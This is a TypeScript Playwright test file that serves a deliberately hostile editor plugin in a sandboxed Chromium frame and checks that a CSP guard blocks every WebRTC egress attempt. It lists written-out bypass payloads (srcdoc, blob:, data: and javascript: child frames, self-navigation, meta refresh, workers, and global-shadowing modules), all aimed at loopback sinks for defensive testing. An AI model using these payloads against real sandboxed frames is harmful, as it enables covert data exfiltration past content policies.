/**
 * The editor-frame egress probe: a hostile editor plugin, served by crew's own routes (the frame guard, `serveBundle`,
 * the shell policy), framed in Chromium the way studio's host frames it (`sandbox="allow-scripts"`), tries every way
 * it has to open WebRTC: the constructors directly and after trying to restore them, and from a new realm (a child
 * frame of each kind, a worker, or the frame navigating itself to a document it made). Each attempt gets its own
 * loopback UDP sink standing in for a STUN/TURN server. The probe passes only when zero packets arrive.
 *
 * It cannot pass by accident. The hostile plugin must report that it ran, and where an attempt does open a new realm,
 * that realm must report that it found no constructor. The same plugin served raw under the policy crew used before
 * (`BEFORE`) must get packets through: that proves the sink and the browser's WebRTC work. A well-behaved bundle with
 * awkward scripts must run every one of them with no policy violation.
 *
 * Chromium comes from the `playwright` dev dependency (`npx playwright install --only-shell chromium`). CI's ubuntu leg
 * installs it and sets `WICKED_EGRESS_PROBE=required`, so a missing browser fails there. Anywhere else, with no
 * browser, the probe is skipped and says why.
 */
import { createSocket, type Socket } from 'node:dgram';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import Fastify, { type FastifyInstance } from 'fastify';
import type { Browser } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { registerFrameGuard } from '../src/api/frame-guard.js';
import { requestOrigin, shellCsp } from '../src/editors/csp.js';
import { sha256Of, type EditorRecord } from '../src/editors/registry.js';
import { serveBundle } from '../src/editors/routes.js';

const REQUIRED = process.env['WICKED_EGRESS_PROBE'] === 'required';

/** The third-party bundle policy crew served before this guard (the positive control runs under it). */
const BEFORE =
  "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; " +
  "media-src blob:; font-src data:; frame-src blob: data: about:; child-src blob: data: about:; connect-src 'none'; " +
  "form-action 'none'; base-uri 'none'; worker-src 'none'; manifest-src 'none'";

/**
 * The hostile plugin: one inline script. In the bundle it reports `ran`, then makes its attempt. In any other
 * document it reports `child-ran` and tries WebRTC there. It hands new documents a copy of its own script (what
 * crew served it, prelude and all): under a hash policy that copy is the only script that can run there.
 */
function hostile(attempt: string, port: number, extra = ''): string {
  const js = `var U=${JSON.stringify(String(port))};
function report(m){try{top.postMessage({probe:String(m)},'*')}catch(e){}}
function rtc(W,tag){try{var C=W.RTCPeerConnection||W.webkitRTCPeerConnection;if(typeof C!=='function'){report(tag+':no-ctor');return}
var pc=new C({iceServers:[{urls:'stun:127.0.0.1:'+U},{urls:'turn:127.0.0.1:'+U+'?transport=udp',username:'leak',credential:'x'}]});
pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).then(function(){report(tag+':offer-set')},function(){});
report(tag+':rtc-created')}catch(e){report(tag+':rtc-threw:'+e.name)}}
var SELF=document.currentScript?document.currentScript.textContent:'';
var CHILD='<scr'+'ipt>'+SELF+'</scr'+'ipt>';
var FRESH='<scr'+'ipt>var U='+JSON.stringify(U)+';'+report+rtc+'rtc(window,"fresh")</scr'+'ipt>';
if(location.protocol!=='http:'){report('child-ran:'+location.protocol);rtc(window,'child')}
else{report('ran');${attempt}}`;
  // `extra` (a module) goes first so the plugin's script can find it; a module runs after the document is parsed anyway.
  return `<!doctype html><html><head><meta charset="utf-8"><title>probe</title></head><body><p>hostile</p>${extra.replaceAll('__PORT__', String(port))}<script>${js}</script></body></html>`;
}

/** Every attempt, and what the new realm (if the browser makes one) must say. */
/** A module whose own top-level declarations shadow `window` (and `TypeError`, which a failing guard must not call):
 *  they are bound before its first statement runs. Self-contained (`__PORT__` is the sink), so that copied into a child
 *  as that realm's ONLY script it is the first code there: nothing else can have locked the realm before it. */
const SHADOWING_MODULE =
  "<script type=\"module\">function window(){} function self(){} function globalThis(){} function TypeError(){ top.postMessage({probe:'shadow-called'},'*') }" +
  "top.postMessage({probe:'module-ran'},'*');var C=document.defaultView.RTCPeerConnection;var pc=new C({iceServers:[{urls:'stun:127.0.0.1:__PORT__'}]});" +
  "pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)})</script>";
/** The plugin copies its module into a srcdoc child, alone. */
const MODULE_ALONE_IN_CHILD =
  "var m=document.querySelector('script[type=module]');var f=document.createElement('iframe');f.srcdoc='<scr'+'ipt type=module>'+m.textContent+'</scr'+'ipt>';document.body.appendChild(f)";
/** What the guard says when it stops a script (`WEBRTC_PRELUDE_REFUSAL`), as the console shows it. */
const REFUSED = 'WebRTC is not available in an editor frame';

const ATTEMPTS: Record<string, { code: string; childMustReport?: string; extra?: string; consoleMust?: string }> = {
  direct: { code: "rtc(window,'direct')" },
  restore: { code: "try{delete window.RTCPeerConnection}catch(e){};Object.getOwnPropertyNames(window).forEach(function(k){if(/RTC/.test(k)&&typeof window[k]==='function')report('found:'+k)});rtc(window,'restore')" },
  'srcdoc-copy': { code: "var f=document.createElement('iframe');f.srcdoc=CHILD;document.body.appendChild(f)", childMustReport: 'child:no-ctor' },
  'srcdoc-fresh': { code: "var f=document.createElement('iframe');f.srcdoc=FRESH;document.body.appendChild(f)" },
  'srcdoc-markup': { code: "document.body.insertAdjacentHTML('beforeend','<iframe srcdoc=\"'+CHILD.replace(/&/g,'&amp;').replace(/\"/g,'&quot;')+'\"></iframe>')", childMustReport: 'child:no-ctor' },
  'javascript-child': { code: "var f=document.createElement('iframe');f.src='javascript:'+JSON.stringify(CHILD);document.body.appendChild(f)" },
  'data-child': { code: "var f=document.createElement('iframe');f.src='data:text/html,'+encodeURIComponent(CHILD);document.body.appendChild(f)" },
  'blob-child': { code: "var f=document.createElement('iframe');f.src=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}));document.body.appendChild(f)" },
  'blank-child': { code: "var f=document.createElement('iframe');document.body.appendChild(f);rtc(f.contentWindow,'blank')" },
  worker: { code: "try{var w=new Worker(URL.createObjectURL(new Blob(['postMessage(typeof RTCPeerConnection)'],{type:'text/javascript'})));w.onmessage=function(e){report('worker:'+e.data)}}catch(e){report('worker-threw')}" },
  handler: { code: "document.body.insertAdjacentHTML('beforeend','<img src=x onerror=\"'+(report+rtc+'rtc(window,\\'handler\\')').replace(/&/g,'&amp;').replace(/\"/g,'&quot;')+'\">')" },
  'navigate-blob': { code: "location.href=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}))", childMustReport: 'child:no-ctor' },
  'navigate-data': { code: "location.href='data:text/html,'+encodeURIComponent(CHILD)", childMustReport: 'child:no-ctor' },
  'navigate-refresh': { code: "var m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+URL.createObjectURL(new Blob([CHILD],{type:'text/html'}));document.head.appendChild(m)", childMustReport: 'child:no-ctor' },
  'navigate-fresh': { code: "location.href=URL.createObjectURL(new Blob([FRESH],{type:'text/html'}))" },
  'navigate-javascript': { code: "location.href='javascript:'+JSON.stringify(CHILD)" },
  'module-shadow': { code: MODULE_ALONE_IN_CHILD, extra: SHADOWING_MODULE, consoleMust: REFUSED },
};

/** A well-behaved bundle with awkward scripts: every one must run under the guard, with no policy violation. */
const WELL_BEHAVED =
  '<!DOCTYPE html>\r\n<html><head><meta charset="utf-8"><style>/* <script>not a script</script> */ p{color:red}</style>' +
  '<script type="application/json" id="data">{"n":3}</script>' +
  '<script>\r\nvar seen=[];function ok(n){seen.push(n);top.postMessage({probe:"ok:"+n},"*")}\r\nvar tag="<script>";var esc="<!--<script>x</script>-->";ok(1)</script>' +
  '</head><body><p title="<script>">x</p><!-- <script>bad()</script> -->' +
  '<script type="module">ok(2)</script>' +
  '<script>ok(JSON.parse(document.getElementById("data").textContent).n)</script>' +
  // Strict mode survives the prelude; a hashbang stays first; a script's own RTC-named globals are its own.
  '<script>"use strict";ok((function(){return this})()===undefined?4:-4)</script>' +
  '<script>#!/usr/bin/env node\nvar RTCConfig={n:5};function RTCHelper(){return RTCConfig.n}ok(RTCHelper())</script>' +
  '</body></html>';

/**
 * A document the page or deck editor shows in its nested frame, written to get WebRTC out: its own script reports
 * `agent-ran` and makes one attempt; any new realm it makes runs a copy of that script and reports `child-*`.
 */
function agentDoc(editor: string, attempt: string, port: number): string {
  const js = `var U=${JSON.stringify(String(port))};
function report(m){try{top.postMessage({probe:String(m)},'*')}catch(e){}}
function rtc(W,tag){try{var C=W.RTCPeerConnection||W.webkitRTCPeerConnection;if(typeof C!=='function'){report(tag+':no-ctor');return}
var pc=new C({iceServers:[{urls:'stun:127.0.0.1:'+U}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});report(tag+':rtc-created')}catch(e){report(tag+':rtc-threw:'+e.name)}}
var SELF=document.currentScript?document.currentScript.textContent:'';
var CHILD='<scr'+'ipt>'+SELF+'</scr'+'ipt>';
var FRESH='<scr'+'ipt>var U='+JSON.stringify(U)+';'+report+rtc+'rtc(window,"fresh")</scr'+'ipt>';
if(!document.documentElement.hasAttribute('data-agent-root')){report('child-ran:'+location.protocol);rtc(window,'child')}
else if(!window.__probeDone){window.__probeDone=1;report('agent-ran');${NESTED_ATTEMPTS[attempt]}}`;
  const scripts = `${attempt === 'module-shadow' ? SHADOWING_MODULE.replaceAll('__PORT__', String(port)) : ''}<script>${js}</script>`;
  return editor === 'wicked-deck'
    ? `<!doctype html><html data-agent-root><head><style>.wi-slide{width:1280px;height:720px}</style></head><body data-wi-kind="deck"><section class="wi-slide" data-wid="s0" data-slide-id="s-a"><h1 data-wid="h0">A slide</h1>${scripts}</section><section class="wi-slide" data-wid="s1" data-slide-id="s-b"><h2 data-wid="h1">Two</h2></section></body></html>`
    : `<!doctype html><html data-agent-root><head><title>p</title></head><body><p data-wid="p0">A page</p>${scripts}</body></html>`;
}
const NESTED_ATTEMPTS: Record<string, string> = {
  direct: "rtc(window,'agent')",
  'srcdoc-copy': "var f=document.createElement('iframe');f.srcdoc=CHILD;document.body.appendChild(f)",
  'srcdoc-fresh': "var f=document.createElement('iframe');f.srcdoc=FRESH;document.body.appendChild(f)",
  handler: "document.body.insertAdjacentHTML('beforeend','<img src=x onerror=\"'+(report+rtc+'rtc(window,\\'handler\\')').replace(/&/g,'&amp;').replace(/\"/g,'&quot;')+'\">')",
  'javascript-child': "var f=document.createElement('iframe');f.src='javascript:'+JSON.stringify(CHILD);document.body.appendChild(f)",
  'blob-child': "var f=document.createElement('iframe');f.src=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}));document.body.appendChild(f)",
  'data-child': "var f=document.createElement('iframe');f.src='data:text/html,'+encodeURIComponent(CHILD);document.body.appendChild(f)",
  'navigate-blob': "location.href=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}))",
  'navigate-data': "location.href='data:text/html,'+encodeURIComponent(CHILD)",
  worker: "try{var w=new Worker(URL.createObjectURL(new Blob(['postMessage(typeof RTCPeerConnection)'],{type:'text/javascript'})));w.onmessage=function(e){report('worker:'+e.data)}}catch(e){report('worker-threw')}",
  'module-shadow': MODULE_ALONE_IN_CHILD,
};

interface Sink { port: number; packets: () => number; close: () => void }
async function udpSink(): Promise<Sink> {
  const sock: Socket = createSocket('udp4');
  let count = 0;
  sock.on('message', () => { count += 1; });
  await new Promise<void>((resolve) => sock.bind(0, '127.0.0.1', () => resolve()));
  return { port: sock.address().port, packets: () => count, close: () => sock.close() };
}

describe('editor frames: zero WebRTC egress from a hostile plugin (Chromium, crew\'s real routes)', () => {
  let browser: Browser | null = null;
  let unavailable = '';
  let app: FastifyInstance;
  let origin = '';
  const dir = mkdtempSync(join(tmpdir(), 'egress-probe-'));
  const records = new Map<string, EditorRecord>();
  const control = new Map<string, string>();
  const agentDocs = new Map<string, string>();

  const record = (id: string, html: string, firstParty: boolean): void => {
    const entryPath = join(dir, `${id}.html`);
    writeFileSync(entryPath, html);
    const buf = Buffer.from(html);
    records.set(id, {
      manifest: { id, title: id, version: '1.0.0', protocol: [1], kinds: ['page'], entry: 'index.html', sizes: ['inline'], permissions: [] },
      sha256: sha256Of(buf),
      bytes: buf.length,
      entryPath,
      firstParty,
      source: firstParty ? 'studio-bundle' : 'pack',
      enabled: true,
    } as unknown as EditorRecord);
  };

  beforeAll(async () => {
    try {
      const { chromium } = await import('playwright');
      browser = await chromium.launch();
    } catch (err) {
      unavailable = (err instanceof Error ? err.message : String(err)).split('\n')[0]!;
    }
    app = Fastify();
    registerFrameGuard(app, { allowedOrigins: [] });
    // The studio shell, as crew serves index.html: its frame-src, and a frame made the way studio's host makes one.
    app.get('/shell', async (req, reply) => {
      const src = String((req.query as { src?: string }).src ?? '');
      reply.header('Content-Security-Policy', shellCsp(requestOrigin(req)));
      return reply.type('text/html').send(
        `<!doctype html><body><script>window.R=[];addEventListener('message',function(e){if(e.data&&e.data.probe)R.push(e.data.probe)});` +
          `var f=document.createElement('iframe');f.setAttribute('sandbox','allow-scripts');f.setAttribute('referrerpolicy','no-referrer');` +
          `f.src=${JSON.stringify(src)};document.body.appendChild(f);</script></body>`,
      );
    });
    // Studio's host for a first-party editor: the one-time handshake, then `artifact.read` answered with `agent`.
    app.get('/host', async (req, reply) => {
      const q = req.query as { id?: string; doc?: string };
      reply.header('Content-Security-Policy', shellCsp(requestOrigin(req)));
      return reply.type('text/html').send(
        `<!doctype html><body><script>window.R=[];var HTML=${JSON.stringify(agentDocs.get(String(q.doc)) ?? '').replace(/</g, '\\u003c')};` +
          `var f=document.createElement('iframe');f.setAttribute('sandbox','allow-scripts');f.style.cssText='width:1300px;height:800px';` +
          `f.src='/api/v1/editors/${String(q.id)}/1.0.0/entry';var ch=new MessageChannel();` +
          `addEventListener('message',function(e){var d=e.data||{};if(d.probe){R.push(d.probe);return}` +
          `if(d.type==='plugin.ready'&&e.source===f.contentWindow){R.push('plugin-ready');f.contentWindow.postMessage({p:'wicked.editor',v:1,type:'host.hello',payload:{grants:['artifact.read'],size:'pane',theme:{}}},'*',[ch.port2])}});` +
          `ch.port1.onmessage=function(m){var d=m.data||{};if(d.type==='artifact.read'&&d.id){R.push('artifact-read');ch.port1.postMessage({p:'wicked.editor',v:1,re:d.id,ok:true,payload:{version:1,head:1,content:{type:'html',html:HTML}}})}};` +
          `document.body.appendChild(f);</script></body>`,
      );
    });
    app.get('/api/v1/editors/control/:id/entry', async (req, reply) => {
      const html = control.get((req.params as { id: string }).id);
      if (html === undefined) return reply.code(404).send({});
      return reply.header('Content-Security-Policy', BEFORE).type('text/html; charset=utf-8').send(html);
    });
    app.get('/api/v1/editors/:id/:version/entry', async (req, reply) => {
      const r = records.get((req.params as { id: string }).id);
      if (r === undefined) return reply.code(404).send({});
      return serveBundle(r, reply);
    });
    origin = await app.listen({ port: 0, host: '127.0.0.1' });
  });

  afterAll(async () => {
    await browser?.close();
    await app?.close();
    rmSync(dir, { recursive: true, force: true });
  });

  /** One frame load: what the frames reported, the policy refusals in the console, and the packets the sink got. */
  async function load(src: string, sink: Sink, settleMs = 1500, waitFor?: string): Promise<{ said: string[]; refused: string[]; logs: string[]; packets: number }> {
    const page = await browser!.newPage();
    const refused: string[] = [];
    const logs: string[] = [];
    page.on('console', (m) => {
      logs.push(m.text().slice(0, 160));
      if (/Content Security Policy|Content-Security-Policy/.test(m.text())) refused.push(m.text().slice(0, 140));
    });
    // A script the guard stops throws: that reaches Playwright as an uncaught error, from whichever frame it ran in.
    page.on('pageerror', (e) => logs.push(`pageerror: ${e.message}`.slice(0, 160)));
    try {
      await page.goto(`${origin}/shell?src=${encodeURIComponent(src)}`);
      await page.waitForFunction('window.R && window.R.length > 0', undefined, { timeout: 10_000 }).catch(() => undefined);
      // A new realm reports later than the plugin itself (a navigation, a child frame): wait for it on a busy runner.
      if (waitFor !== undefined) await page.waitForFunction((m) => (window as unknown as { R: string[] }).R.includes(m), waitFor, { timeout: 10_000 }).catch(() => undefined);
      await page.waitForTimeout(settleMs);
      const said = (await page.evaluate('window.R')) as string[];
      return { said, refused, logs, packets: sink.packets() };
    } finally {
      await page.close();
    }
  }

  const needBrowser = (skip: () => void): void => {
    if (browser !== null) return;
    if (REQUIRED) throw new Error(`WICKED_EGRESS_PROBE=required but Chromium did not start: ${unavailable}`);
    console.warn(`[egress probe] skipped: no Chromium (${unavailable}). Run \`npx playwright install --only-shell chromium\`.`);
    skip();
  };

  it('positive control: the same plugin under the policy crew served before reaches the sink (the sink and WebRTC work)', async (ctx) => {
    needBrowser(() => ctx.skip());
    const sink = await udpSink();
    try {
      control.set('direct', hostile(ATTEMPTS['direct']!.code, sink.port));
      const r = await load('/api/v1/editors/control/direct/entry', sink);
      expect(r.said).toContain('ran');
      expect(r.packets, JSON.stringify(r)).toBeGreaterThan(0);
    } finally {
      sink.close();
    }
  }, 60_000);

  it('a third-party plugin: zero packets from every attempt, and every new realm it opened found no constructor', async (ctx) => {
    needBrowser(() => ctx.skip());
    const names = Object.keys(ATTEMPTS);
    const results: Record<string, { said: string[]; refused: string[]; logs: string[]; packets: number }> = {};
    for (let i = 0; i < names.length; i += 6) {
      await Promise.all(names.slice(i, i + 6).map(async (name) => {
        const sink = await udpSink();
        try {
          record(`acme-${name}`, hostile(ATTEMPTS[name]!.code, sink.port, ATTEMPTS[name]!.extra), false);
          results[name] = await load(`/api/v1/editors/acme-${name}/1.0.0/entry`, sink, 1500, ATTEMPTS[name]!.childMustReport);
        } finally {
          sink.close();
        }
      }));
    }
    console.log(`[egress probe] third-party packets per attempt: ${names.map((n) => `${n}=${results[n]!.packets}`).join(' ')}`);
    for (const name of names) {
      const r = results[name]!;
      expect(r.said, `${name}: the plugin ran (${JSON.stringify(r)})`).toContain('ran');
      expect(r.packets, `${name}: UDP packets (${JSON.stringify(r)})`).toBe(0);
      expect(r.said.filter((m) => /rtc-created|offer-set|^found:|^module-ran|^shadow-called/.test(m)), name).toEqual([]);
      const must = ATTEMPTS[name]!.childMustReport;
      if (must !== undefined) expect(r.said, `${name}: the new realm ran and found no constructor`).toContain(must);
      const stopped = ATTEMPTS[name]!.consoleMust;
      if (stopped !== undefined) expect(r.logs.some((l) => l.includes(stopped)), `${name}: the guard stopped the script (${JSON.stringify(r.logs)})`).toBe(true);
    }
  }, 120_000);

  // A first-party bundle is studio's own code: what matters is that the prelude runs in it and that its nested frames
  // (which hold agent HTML, guarded by studio) cannot load a URL. Where the bundle's own frame navigates is studio's
  // shell policy, which keeps `blob:` for run plugins.
  it('a first-party bundle: the prelude runs (no constructor) and it cannot load a child frame from a URL', async (ctx) => {
    needBrowser(() => ctx.skip());
    for (const name of ['direct', 'blob-child', 'data-child']) {
      const sink = await udpSink();
      try {
        record(`wicked-${name}`, hostile(ATTEMPTS[name]!.code, sink.port), true);
        const r = await load(`/api/v1/editors/wicked-${name}/1.0.0/entry`, sink);
        expect(r.said, name).toContain('ran');
        expect(r.packets, `${name}: ${JSON.stringify(r)}`).toBe(0);
        if (name === 'direct') expect(r.said).toContain('direct:no-ctor');
        if (name !== 'direct') expect(r.refused.some((m) => /frame-src/.test(m)), `${name}: refused by frame-src`).toBe(true);
      } finally {
        sink.close();
      }
    }
  }, 60_000);

  it('a well-behaved third-party bundle with awkward scripts still runs every script, with no policy refusal', async (ctx) => {
    needBrowser(() => ctx.skip());
    const sink = await udpSink();
    try {
      record('acme-ok', WELL_BEHAVED, false);
      const r = await load('/api/v1/editors/acme-ok/1.0.0/entry', sink, 800);
      expect(r.said.sort(), JSON.stringify(r)).toEqual(['ok:1', 'ok:2', 'ok:3', 'ok:4', 'ok:5']);
      expect(r.refused).toEqual([]);
    } finally {
      sink.close();
    }
  }, 60_000);

  // Release-shaped (codex r1): the page and deck editors from the studio artifact crew bundles (`wicked-studio` in
  // node_modules, what `build:with-studio` ships), served by crew as first-party bundles, shown a hostile document.
  // Always: each starts, reads the artifact, mounts its nested frame and runs the document's own script, and the
  // bundle frame itself has no WebRTC constructor. Once the bundled studio carries its nested-frame guard (studio's
  // `guardNestedHtml`, found by the prelude's refusal text in the bundle), every attempt from the document must send
  // zero packets; until then the test says, loudly, that the bundled studio does not guard nested frames yet.
  it('the bundled studio\'s page and deck editors: they start and render; nested documents are held to zero packets once the bundled studio guards them', async (ctx) => {
    needBrowser(() => ctx.skip());
    const studioDir = dirname(createRequire(import.meta.url).resolve('wicked-studio/package.json'));
    const studioVersion = (JSON.parse(readFileSync(join(studioDir, 'package.json'), 'utf8')) as { version: string }).version;
    for (const editor of ['wicked-page', 'wicked-deck']) {
      const bundle = readFileSync(join(studioDir, 'dist', 'editors', editor, 'index.html'));
      const guarded = bundle.includes('WebRTC is not available in an editor frame');
      const id = `${editor}-release`;
      const entryPath = join(dir, `${id}.html`);
      writeFileSync(entryPath, bundle);
      records.set(id, {
        manifest: { id, title: id, version: '1.0.0', protocol: [1, 2], kinds: ['page'], entry: 'index.html', sizes: ['inline'], permissions: [] },
        sha256: sha256Of(bundle), bytes: bundle.length, entryPath, firstParty: true, source: 'studio-bundle', enabled: true,
      } as unknown as EditorRecord);
      const outcomes: string[] = [];
      for (const attempt of Object.keys(NESTED_ATTEMPTS)) {
        const sink = await udpSink();
        try {
          const doc = `${editor}-${attempt}`;
          agentDocs.set(doc, agentDoc(editor, attempt, sink.port));
          const page = await browser!.newPage({ viewport: { width: 1400, height: 900 } });
          const logs: string[] = [];
          page.on('console', (m) => logs.push(m.text().slice(0, 160)));
          page.on('pageerror', (e) => logs.push(`pageerror: ${e.message}`.slice(0, 160)));
          try {
            await page.goto(`${origin}/host?id=${id}&doc=${encodeURIComponent(doc)}`);
            await page.waitForFunction("window.R.includes('agent-ran')", undefined, { timeout: 10_000 }).catch(() => undefined);
            await page.waitForTimeout(1200);
            const said = (await page.evaluate('window.R')) as string[];
            const bundleFrame = page.frames().find((f) => f.url().includes(`/api/v1/editors/${id}/`));
            const ctor = bundleFrame === undefined ? 'no frame' : await bundleFrame.evaluate('typeof RTCPeerConnection');
            expect(said, `${editor} ${attempt}: started and read the artifact`).toEqual(expect.arrayContaining(['plugin-ready', 'artifact-read', 'agent-ran']));
            expect(ctor, `${editor}: the bundle frame itself`).toBe('undefined');
            if (guarded) {
              expect(sink.packets(), `${editor} ${attempt}: ${JSON.stringify(said)}`).toBe(0);
              expect(said.filter((m) => /rtc-created|^module-ran|^shadow-called/.test(m)), `${editor} ${attempt}`).toEqual([]);
              if (attempt === 'srcdoc-copy') expect(said, `${editor}: the copy ran in the child and found no constructor`).toContain('child:no-ctor');
              if (attempt === 'module-shadow') expect(logs.some((l) => l.includes(REFUSED)), `${editor}: the guard stopped the module`).toBe(true);
            }
            outcomes.push(`${attempt}=${sink.packets()}`);
          } finally {
            await page.close();
          }
        } finally {
          sink.close();
        }
      }
      if (guarded) console.log(`[egress probe] bundled wicked-studio ${studioVersion} ${editor} nested frames (guarded): ${outcomes.join(' ')}`);
      else console.warn(`[egress probe] bundled wicked-studio ${studioVersion} ${editor}: its nested frames are NOT guarded yet (studio's guardNestedHtml ships in a later studio release); packets per attempt: ${outcomes.join(' ')}`);
    }
  }, 180_000);
});
